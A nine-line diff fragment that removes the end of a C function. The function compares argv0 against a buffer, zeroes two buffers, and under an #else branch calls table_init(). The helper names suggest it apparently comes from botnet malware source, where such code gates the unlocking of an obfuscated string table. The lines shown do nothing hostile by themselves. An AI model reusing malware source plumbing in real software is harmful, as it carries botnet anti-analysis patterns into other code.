-    matches = util_strcmp(argv0, buf_dst);
-    util_zero(buf_src, sizeof (buf_src));
-    util_zero(buf_dst, sizeof (buf_dst));
-    return matches;
-#else
-    table_init();
-    return TRUE;
-#endif
-}
